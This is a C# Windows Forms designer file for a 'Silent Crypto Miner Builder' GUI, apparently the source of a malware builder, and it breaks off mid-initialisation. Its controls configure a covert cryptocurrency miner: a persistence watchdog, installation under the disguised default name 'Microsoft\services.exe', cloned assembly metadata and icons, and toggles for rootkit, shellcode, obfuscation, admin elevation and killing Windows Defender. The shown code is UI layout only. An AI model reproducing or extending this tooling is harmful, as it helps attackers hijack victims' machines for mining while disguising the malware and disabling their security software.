using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class Builder : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Builder));
            this.BackgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.formBuilder = new MephTheme();
            this.MephTabcontrol2 = new MephTabcontrol();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.labelLang = new System.Windows.Forms.Label();
            this.mephComboBox1 = new MephComboBox();
            this.btnLoadState = new MephButton();
            this.btnSaveState = new MephButton();
            this.listMiners = new MephListBox();
            this.btnMinerRemove = new MephButton();
            this.btnMinerEdit = new MephButton();
            this.btnMinerAdd = new MephButton();
            this.labelMiners = new System.Windows.Forms.Label();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.labelHelp = new System.Windows.Forms.Label();
            this.TabPage2 = new System.Windows.Forms.TabPage();
            this.labelStartupWatchdog = new System.Windows.Forms.Label();
            this.toggleWatchdog = new MephToggleSwitch();
            this.chkInstall = new MephCheckBox();
            this.txtInstallFileName = new MephTextBox();
            this.labelStartupSavePath = new System.Windows.Forms.Label();
            this.labelStartupFilename = new System.Windows.Forms.Label();
            this.txtInstallPath = new MephComboBox();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.labelAssemblyVersion = new System.Windows.Forms.Label();
            this.chkAssembly = new MephCheckBox();
            this.btnAssemblyRandom = new MephButton();
            this.txtAssemblyTitle = new MephTextBox();
            this.btnAssemblyClone = new MephButton();
            this.txtAssemblyProduct = new MephTextBox();
            this.txtAssemblyVersion4 = new MephTextBox();
            this.txtAssemblyDescription = new MephTextBox();
            this.txtAssemblyVersion3 = new MephTextBox();
            this.txtAssemblyCopyright = new MephTextBox();
            this.txtAssemblyVersion2 = new MephTextBox();
            this.txtAssemblyCompany = new MephTextBox();
            this.txtAssemblyVersion1 = new MephTextBox();
            this.txtAssemblyTrademark = new MephTextBox();
            this.TabPage4 = new System.Windows.Forms.TabPage();
            this.chkIcon = new MephCheckBox();
            this.picIcon = new System.Windows.Forms.PictureBox();
            this.btnBrowseIcon = new MephButton();
            this.txtIconPath = new MephTextBox();
            this.TabPage6 = new System.Windows.Forms.TabPage();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.labelOptionRootkit = new System.Windows.Forms.Label();
            this.toggleRootkit = new MephToggleSwitch();
            this.labelOptionShellcode = new System.Windows.Forms.Label();
            this.toggleShellcode = new MephToggleSwitch();
            this.labelOptionAdministrator = new System.Windows.Forms.Label();
            this.toggleAdministrator = new MephToggleSwitch();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.labelOptionDebug = new System.Windows.Forms.Label();
            this.toggleDebug = new MephToggleSwitch();
            this.labelOptionObfuscation = new System.Windows.Forms.Label();
            this.toggleObfuscation = new MephToggleSwitch();
            this.labelOptionWD = new System.Windows.Forms.Label();
            this.toggleKillWD = new MephToggleSwitch();
            this.TabPage5 = new System.Windows.Forms.TabPage();
            this.labelSeconds = new System.Windows.Forms.Label();
            this.labelStartDelay = new System.Windows.Forms.Label();
            this.txtStartDelay = new MephTextBox();
            this.labelHackforums = new System.Windows.Forms.LinkLabel();
            this.labelGitHub = new System.Windows.Forms.LinkLabel();
            this.txtLog = new MephTextBox();
            this.btnBuild = new MephButton();
            this.formBuilder.SuspendLayout();
            this.MephTabcontrol2.SuspendLayout();
            this.TabPage1.SuspendLayout();
            this.TabPage2.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.TabPage4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).BeginInit();
            this.TabPage6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            this.TabPage5.SuspendLayout();
            this.SuspendLayout();
            // 
            // BackgroundWorker2
            // 
            this.BackgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.BackgroundWorker2_DoWork);
            // 
            // formBuilder
            // 
            this.formBuilder.AccentColor = System.Drawing.Color.Transparent;
            this.formBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formBuilder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formBuilder.Controls.Add(this.MephTabcontrol2);
            this.formBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formBuilder.ForeColor = System.Drawing.Color.Gray;
            this.formBuilder.Location = new System.Drawing.Point(0, 0);
            this.formBuilder.Margin = new System.Windows.Forms.Padding(2);
            this.formBuilder.MaximumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.MinimumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.Name = "formBuilder";
            this.formBuilder.Size = new System.Drawing.Size(535, 272);
            this.formBuilder.SubHeader = "By Unam Sanctam";
            this.formBuilder.TabIndex = 0;
            this.formBuilder.Text = "Silent Crypto Miner Builder 2.0.1";
            // 
            // MephTabcontrol2
            // 
            this.MephTabcontrol2.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.MephTabcontrol2.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.MephTabcontrol2.Controls.Add(this.TabPage1);
            this.MephTabcontrol2.Controls.Add(this.TabPage2);
            this.MephTabcontrol2.Controls.Add(this.TabPage3);
            this.MephTabcontrol2.Controls.Add(this.TabPage4);
            this.MephTabcontrol2.Controls.Add(this.TabPage6);
            this.MephTabcontrol2.Controls.Add(this.TabPage5);
            this.MephTabcontrol2.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.MephTabcontrol2.ItemSize = new System.Drawing.Size(32, 85);
            this.MephTabcontrol2.Location = new System.Drawing.Point(12, 65);
            this.MephTabcontrol2.Multiline = true;
            this.MephTabcontrol2.Name = "MephTabcontrol2";
            this.MephTabcontrol2.SelectedIndex = 0;
            this.MephTabcontrol2.Size = new System.Drawing.Size(511, 197);
            this.MephTabcontrol2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.MephTabcontrol2.TabIndex = 17;
            // 
            // TabPage1
            // 
            this.TabPage1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage1.Controls.Add(this.labelLang);
            this.TabPage1.Controls.Add(this.mephComboBox1);
            this.TabPage1.Controls.Add(this.btnLoadState);
            this.TabPage1.Controls.Add(this.btnSaveState);
            this.TabPage1.Controls.Add(this.listMiners);
            this.TabPage1.Controls.Add(this.btnMinerRemove);
            this.TabPage1.Controls.Add(this.btnMinerEdit);
            this.TabPage1.Controls.Add(this.btnMinerAdd);
            this.TabPage1.Controls.Add(this.labelMiners);
            this.TabPage1.Controls.Add(this.labelWiki);
            this.TabPage1.Controls.Add(this.labelHelp);
            this.TabPage1.Location = new System.Drawing.Point(89, 4);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Size = new System.Drawing.Size(418, 189);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Main";
            // 
            // labelLang
            // 
            this.labelLang.AutoSize = true;
            this.labelLang.Location = new System.Drawing.Point(15, 160);
            this.labelLang.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelLang.Name = "labelLang";
            this.labelLang.Size = new System.Drawing.Size(68, 17);
            this.labelLang.TabIndex = 51;
            this.labelLang.Text = "Language:";
            // 
            // mephComboBox1
            // 
            this.mephComboBox1.BackColor = System.Drawing.Color.Transparent;
            this.mephComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.mephComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.mephComboBox1.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.mephComboBox1.ForeColor = System.Drawing.Color.Silver;
            this.mephComboBox1.FormattingEnabled = true;
            this.mephComboBox1.ItemHeight = 16;
            this.mephComboBox1.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.mephComboBox1.Items.AddRange(new object[] {
            "English"});
            this.mephComboBox1.Location = new System.Drawing.Point(83, 158);
            this.mephComboBox1.Margin = new System.Windows.Forms.Padding(2);
            this.mephComboBox1.Name = "mephComboBox1";
            this.mephComboBox1.Size = new System.Drawing.Size(97, 22);
            this.mephComboBox1.StartIndex = 0;
            this.mephComboBox1.TabIndex = 50;
            // 
            // btnLoadState
            // 
            this.btnLoadState.BackColor = System.Drawing.Color.Transparent;
            this.btnLoadState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnLoadState.Location = new System.Drawing.Point(354, 158);
            this.btnLoadState.Name = "btnLoadState";
            this.btnLoadState.Size = new System.Drawing.Size(53, 22);
            this.btnLoadState.TabIndex = 49;
            this.btnLoadState.Text = "Load";
            this.btnLoadState.Click += new System.EventHandler(this.btnLoadState_Click);
            // 
            // btnSaveState
            // 
            this.btnSaveState.BackColor = System.Drawing.Color.Transparent;
            this.btnSaveState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSaveState.Location = new System.Drawing.Point(295, 158);
            this.btnSaveState.Name = "btnSaveState";
            this.btnSaveState.Size = new System.Drawing.Size(53, 22);
            this.btnSaveState.TabIndex = 48;
            this.btnSaveState.Text = "Save";
            this.btnSaveState.Click += new System.EventHandler(this.btnSaveState_Click);
            // 
            // listMiners
            // 
            this.listMiners.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listMiners.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listMiners.ForeColor = System.Drawing.Color.Silver;
            this.listMiners.ItemHeight = 17;
            this.listMiners.Location = new System.Drawing.Point(15, 31);
            this.listMiners.Name = "listMiners";
            this.listMiners.Size = new System.Drawing.Size(392, 72);
            this.listMiners.TabIndex = 47;
            // 
            // btnMinerRemove
            // 
            this.btnMinerRemove.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerRemove.Location = new System.Drawing.Point(173, 109);
            this.btnMinerRemove.Name = "btnMinerRemove";
            this.btnMinerRemove.Size = new System.Drawing.Size(73, 23);
            this.btnMinerRemove.TabIndex = 46;
            this.btnMinerRemove.Text = "Remove";
            this.btnMinerRemove.Click += new System.EventHandler(this.btnMinerRemove_Click);
            // 
            // btnMinerEdit
            // 
            this.btnMinerEdit.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerEdit.Location = new System.Drawing.Point(94, 109);
            this.btnMinerEdit.Name = "btnMinerEdit";
            this.btnMinerEdit.Size = new System.Drawing.Size(73, 23);
            this.btnMinerEdit.TabIndex = 45;
            this.btnMinerEdit.Text = "Edit";
            this.btnMinerEdit.Click += new System.EventHandler(this.btnMinerEdit_Click);
            // 
            // btnMinerAdd
            // 
            this.btnMinerAdd.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerAdd.Location = new System.Drawing.Point(15, 109);
            this.btnMinerAdd.Name = "btnMinerAdd";
            this.btnMinerAdd.Size = new System.Drawing.Size(73, 23);
            this.btnMinerAdd.TabIndex = 44;
            this.btnMinerAdd.Text = "Add";
            this.btnMinerAdd.Click += new System.EventHandler(this.btnMinerAdd_Click);
            // 
            // labelMiners
            // 
            this.labelMiners.AutoSize = true;
            this.labelMiners.Location = new System.Drawing.Point(12, 11);
            this.labelMiners.Name = "labelMiners";
            this.labelMiners.Size = new System.Drawing.Size(51, 17);
            this.labelMiners.TabIndex = 42;
            this.labelMiners.Text = "Miners:";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 11);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            this.labelWiki.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelWiki_LinkClicked);
            // 
            // labelHelp
            // 
            this.labelHelp.AutoSize = true;
            this.labelHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelHelp.Location = new System.Drawing.Point(226, 11);
            this.labelHelp.Name = "labelHelp";
            this.labelHelp.Size = new System.Drawing.Size(160, 17);
            this.labelHelp.TabIndex = 41;
            this.labelHelp.Text = "For help please check the ";
            // 
            // TabPage2
            // 
            this.TabPage2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage2.Controls.Add(this.labelStartupWatchdog);
            this.TabPage2.Controls.Add(this.toggleWatchdog);
            this.TabPage2.Controls.Add(this.chkInstall);
            this.TabPage2.Controls.Add(this.txtInstallFileName);
            this.TabPage2.Controls.Add(this.labelStartupSavePath);
            this.TabPage2.Controls.Add(this.labelStartupFilename);
            this.TabPage2.Controls.Add(this.txtInstallPath);
            this.TabPage2.Location = new System.Drawing.Point(89, 4);
            this.TabPage2.Name = "TabPage2";
            this.TabPage2.Size = new System.Drawing.Size(418, 189);
            this.TabPage2.TabIndex = 1;
            this.TabPage2.Text = "Startup";
            // 
            // labelStartupWatchdog
            // 
            this.labelStartupWatchdog.AutoSize = true;
            this.labelStartupWatchdog.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupWatchdog.Location = new System.Drawing.Point(12, 109);
            this.labelStartupWatchdog.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupWatchdog.Name = "labelStartupWatchdog";
            this.labelStartupWatchdog.Size = new System.Drawing.Size(70, 17);
            this.labelStartupWatchdog.TabIndex = 45;
            this.labelStartupWatchdog.Text = "Watchdog:";
            // 
            // toggleWatchdog
            // 
            this.toggleWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.toggleWatchdog.Checked = true;
            this.toggleWatchdog.ForeColor = System.Drawing.Color.Black;
            this.toggleWatchdog.Location = new System.Drawing.Point(84, 107);
            this.toggleWatchdog.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWatchdog.Name = "toggleWatchdog";
            this.toggleWatchdog.Size = new System.Drawing.Size(50, 24);
            this.toggleWatchdog.TabIndex = 44;
            this.toggleWatchdog.Text = "Enable GPU Mining";
            // 
            // chkInstall
            // 
            this.chkInstall.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkInstall.BackColor = System.Drawing.Color.Transparent;
            this.chkInstall.Checked = false;
            this.chkInstall.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkInstall.ForeColor = System.Drawing.Color.Black;
            this.chkInstall.Location = new System.Drawing.Point(14, 12);
            this.chkInstall.Margin = new System.Windows.Forms.Padding(2);
            this.chkInstall.Name = "chkInstall";
            this.chkInstall.Size = new System.Drawing.Size(111, 24);
            this.chkInstall.TabIndex = 21;
            this.chkInstall.Text = "Disabled";
            this.chkInstall.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkInstall_CheckedChanged);
            // 
            // txtInstallFileName
            // 
            this.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtInstallFileName.Enabled = false;
            this.txtInstallFileName.ForeColor = System.Drawing.Color.Silver;
            this.txtInstallFileName.Location = new System.Drawing.Point(84, 74);
            this.txtInstallFileName.Margin = new System.Windows.Forms.Padding(2);
            this.txtInstallFileName.MaxLength = 32767;
            this.txtInstallFileName.MultiLine = false;
            this.txtInstallFileName.Name = "txtInstallFileName";
            this.txtInstallFileName.Size = new System.Drawing.Size(139, 24);
            this.txtInstallFileName.TabIndex = 8;
            this.txtInstallFileName.Text = "Microsoft\\services.exe";
            this.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtInstallFileName.UseSystemPasswordChar = false;
            this.txtInstallFileName.WordWrap = false;
            // 
            // labelStartupSavePath
            // 
            this.labelStartupSavePath.AutoSize = true;
            this.labelStartupSavePath.Location = new System.Drawing.Point(11, 43);
            this.labelStartupSavePath.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupSavePath.Name = "labelStartupSavePath";
            this.labelStartupSavePath.Size = new System.Drawing.Size(67, 17);
            this.labelStartupSavePath.TabIndex = 19;
            this.labelStartupSavePath.Text = "Save Path:";
            // 
            // labelStartupFilename
            // 
            this.labelStartupFilename.AutoSize = true;
            this.labelStartupFilename.Location = new System.Drawing.Point(11, 76);
            this.labelStartupFilename.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupFilename.Name = "labelStartupFilename";
            this.labelStartupFilename.Size = new System.Drawing.Size(62, 17);
            this.labelStartupFilename.TabIndex = 9;
            this.labelStartupFilename.Text = "Filename:";
            // 
            // txtInstallPath
            // 
            this.txtInstallPath.BackColor = System.Drawing.Color.Transparent;
            this.txtInstallPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtInstallPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtInstallPath.Enabled = false;
            this.txtInstallPath.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.txtInstallPath.ForeColor = System.Drawing.Color.Silver;
            this.txtInstallPath.FormattingEnabled = true;
            this.txtInstallPath.ItemHeight = 16;
            this.txtInstallPath.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtInstallPath.Items.AddRange(new object[] {
            "AppData",
            "UserProfile",
            "Temp"});
            this.txtInstallPath.Location = new System.Drawing.Point(84, 43);
            this.txtInstallPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtInstallPath.Name = "txtInstallPath";
            this.txtInstallPath.Size = new System.Drawing.Size(139, 22);
            this.txtInstallPath.StartIndex = 0;
            this.txtInstallPath.TabIndex = 18;
            // 
            // TabPage3
            // 
            this.TabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage3.Controls.Add(this.labelAssemblyVersion);
            this.TabPage3.Controls.Add(this.chkAssembly);
            this.TabPage3.Controls.Add(this.btnAssemblyRandom);
            this.TabPage3.Controls.Add(this.txtAssemblyTitle);
            this.TabPage3.Controls.Add(this.btnAssemblyClone);
            this.TabPage3.Controls.Add(this.txtAssemblyProduct);
            this.TabPage3.Controls.Add(this.txtAssemblyVersion4);
            this.TabPage3.Controls.Add(this.txtAssemblyDescription);
            this.TabPage3.Controls.Add(this.txtAssemblyVersion3);
            this.TabPage3.Controls.Add(this.txtAssemblyCopyright);
            this.TabPage3.Controls.Add(this.txtAssemblyVersion2);
            this.TabPage3.Controls.Add(this.txtAssemblyCompany);
            this.TabPage3.Controls.Add(this.txtAssemblyVersion1);
            this.TabPage3.Controls.Add(this.txtAssemblyTrademark);
            this.TabPage3.Location = new System.Drawing.Point(89, 4);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(418, 189);
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = "Assembly";
            // 
            // labelAssemblyVersion
            // 
            this.labelAssemblyVersion.AutoSize = true;
            this.labelAssemblyVersion.Location = new System.Drawing.Point(11, 160);
            this.labelAssemblyVersion.Name = "labelAssemblyVersion";
            this.labelAssemblyVersion.Size = new System.Drawing.Size(54, 17);
            this.labelAssemblyVersion.TabIndex = 22;
            this.labelAssemblyVersion.Text = "Version:";
            // 
            // chkAssembly
            // 
            this.chkAssembly.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAssembly.BackColor = System.Drawing.Color.Transparent;
            this.chkAssembly.Checked = false;
            this.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAssembly.ForeColor = System.Drawing.Color.Black;
            this.chkAssembly.Location = new System.Drawing.Point(14, 12);
            this.chkAssembly.Margin = new System.Windows.Forms.Padding(2);
            this.chkAssembly.Name = "chkAssembly";
            this.chkAssembly.Size = new System.Drawing.Size(111, 24);
            this.chkAssembly.TabIndex = 21;
            this.chkAssembly.Text = "Disabled";
            this.chkAssembly.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAssembly_CheckedChanged);
            // 
            // btnAssemblyRandom
            // 
            this.btnAssemblyRandom.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyRandom.Enabled = false;
            this.btnAssemblyRandom.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyRandom.Location = new System.Drawing.Point(324, 156);
            this.btnAssemblyRandom.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyRandom.Name = "btnAssemblyRandom";
            this.btnAssemblyRandom.Size = new System.Drawing.Size(81, 25);
            this.btnAssemblyRandom.TabIndex = 5;
            this.btnAssemblyRandom.Text = "Randomize";
            this.btnAssemblyRandom.Click += new System.EventHandler(this.btnAssemblyRandom_Click);
            // 
            // txtAssemblyTitle
            // 
            this.txtAssemblyTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTitle.Enabled = false;
            this.txtAssemblyTitle.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTitle.Location = new System.Drawing.Point(14, 47);
            this.txtAssemblyTitle.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTitle.MaxLength = 32767;
            this.txtAssemblyTitle.MultiLine = false;
            this.txtAssemblyTitle.Name = "txtAssemblyTitle";
            this.txtAssemblyTitle.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTitle.TabIndex = 0;
            this.txtAssemblyTitle.Text = "Title...";
            this.txtAssemblyTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTitle.UseSystemPasswordChar = false;
            this.txtAssemblyTitle.WordWrap = false;
            // 
            // btnAssemblyClone
            // 
            this.btnAssemblyClone.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyClone.Enabled = false;
            this.btnAssemblyClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyClone.Location = new System.Drawing.Point(230, 156);
            this.btnAssemblyClone.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyClone.Name = "btnAssemblyClone";
            this.btnAssemblyClone.Size = new System.Drawing.Size(80, 25);
            this.btnAssemblyClone.TabIndex = 6;
            this.btnAssemblyClone.Text = "Clone File";
            this.btnAssemblyClone.Click += new System.EventHandler(this.btnAssemblyClone_Click);
            // 
            // txtAssemblyProduct
            // 
            this.txtAssemblyProduct.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyProduct.Enabled = false;
            this.txtAssemblyProduct.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyProduct.Location = new System.Drawing.Point(230, 47);
            this.txtAssemblyProduct.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyProduct.MaxLength = 32767;
            this.txtAssemblyProduct.MultiLine = false;
            this.txtAssemblyProduct.Name = "txtAssemblyProduct";
            this.txtAssemblyProduct.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyProduct.TabIndex = 0;
            this.txtAssemblyProduct.Text = "Product...";
            this.txtAssemblyProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyProduct.UseSystemPasswordChar = false;
            this.txtAssemblyProduct.WordWrap = false;
            // 
            // txtAssemblyVersion4
            // 
            this.txtAssemblyVersion4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion4.Enabled = false;
            this.txtAssemblyVersion4.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion4.Location = new System.Drawing.Point(167, 157);
            this.txtAssemblyVersion4.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion4.MaxLength = 32767;
            this.txtAssemblyVersion4.MultiLine = false;
            this.txtAssemblyVersion4.Name = "txtAssemblyVersion4";
            this.txtAssemblyVersion4.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion4.TabIndex = 1;
            this.txtAssemblyVersion4.Text = "0";
            this.txtAssemblyVersion4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion4.UseSystemPasswordChar = false;
            this.txtAssemblyVersion4.WordWrap = false;
            // 
            // txtAssemblyDescription
            // 
            this.txtAssemblyDescription.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyDescription.Enabled = false;
            this.txtAssemblyDescription.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyDescription.Location = new System.Drawing.Point(14, 83);
            this.txtAssemblyDescription.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyDescription.MaxLength = 32767;
            this.txtAssemblyDescription.MultiLine = false;
            this.txtAssemblyDescription.Name = "txtAssemblyDescription";
            this.txtAssemblyDescription.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyDescription.TabIndex = 0;
            this.txtAssemblyDescription.Text = "Description...";
            this.txtAssemblyDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyDescription.UseSystemPasswordChar = false;
            this.txtAssemblyDescription.WordWrap = false;
            // 
            // txtAssemblyVersion3
            // 
            this.txtAssemblyVersion3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion3.Enabled = false;
            this.txtAssemblyVersion3.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion3.Location = new System.Drawing.Point(140, 157);
            this.txtAssemblyVersion3.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion3.MaxLength = 32767;
            this.txtAssemblyVersion3.MultiLine = false;
            this.txtAssemblyVersion3.Name = "txtAssemblyVersion3";
            this.txtAssemblyVersion3.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion3.TabIndex = 2;
            this.txtAssemblyVersion3.Text = "0";
            this.txtAssemblyVersion3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion3.UseSystemPasswordChar = false;
            this.txtAssemblyVersion3.WordWrap = false;
            // 
            // txtAssemblyCopyright
            // 
            this.txtAssemblyCopyright.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCopyright.Enabled = false;
            this.txtAssemblyCopyright.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCopyright.Location = new System.Drawing.Point(230, 83);
            this.txtAssemblyCopyright.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCopyright.MaxLength = 32767;
            this.txtAssemblyCopyright.MultiLine = false;
            this.txtAssemblyCopyright.Name = "txtAssemblyCopyright";
            this.txtAssemblyCopyright.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCopyright.TabIndex = 0;
            this.txtAssemblyCopyright.Text = "Copyright...";
            this.txtAssemblyCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCopyright.UseSystemPasswordChar = false;
            this.txtAssemblyCopyright.WordWrap = false;
            // 
            // txtAssemblyVersion2
            // 
            this.txtAssemblyVersion2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion2.Enabled = false;
            this.txtAssemblyVersion2.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion2.Location = new System.Drawing.Point(113, 157);
            this.txtAssemblyVersion2.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion2.MaxLength = 32767;
            this.txtAssemblyVersion2.MultiLine = false;
            this.txtAssemblyVersion2.Name = "txtAssemblyVersion2";
